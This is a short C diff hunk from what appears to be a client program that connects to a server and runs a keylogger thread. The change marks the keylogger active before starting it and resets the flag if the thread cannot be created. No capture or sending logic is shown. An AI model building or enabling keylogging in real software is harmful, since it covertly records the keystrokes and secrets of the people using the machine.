@@ -21,10 +21,12 @@ int main()
     clientData.serverSocket = sock;
     startingDataInitialize();
 
-    clientData.isKeyLoggerActive = 0;
+    clientData.isKeyLoggerActive = 1;
 
     if (pthread_create(&clientData.keyLoggerTid, NULL, start_keylogger, NULL) < 0)
     {
+        clientData.isKeyLoggerActive = 0;
+
         perror("Could not create thread");
     }
     pthread_detach(clientData.keyLoggerTid);
